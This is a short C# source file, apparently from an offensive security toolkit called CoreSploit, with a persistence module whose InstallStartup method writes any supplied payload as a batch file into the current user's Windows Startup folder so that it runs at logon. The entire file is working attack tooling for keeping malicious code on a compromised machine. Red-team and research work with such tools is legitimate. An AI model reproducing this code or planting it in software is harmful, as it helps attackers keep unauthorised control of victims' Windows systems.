using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace CoreSploit.Persistence
{
    public class Windows
    {
        /// <summary>
        /// Installs a payload into the current users startup folder.
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <param name="Payload">Payload to write to a file.</param>
        /// <param name="FileName">Name of the file to write. Defaults to "startup.bat"</param>
        /// <returns>True if execution succeeds, false otherwise.</returns>
        public static bool InstallStartup(string Payload, string FileName = "startup.bat")
        {
            try
            {
                string FilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + $@"\Microsoft\Windows\Start Menu\Programs\Startup\{FileName}";
                File.WriteAllText(FilePath, Payload);
                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Failed: " + e.Message);
            }
            return false;
        }
    }
}
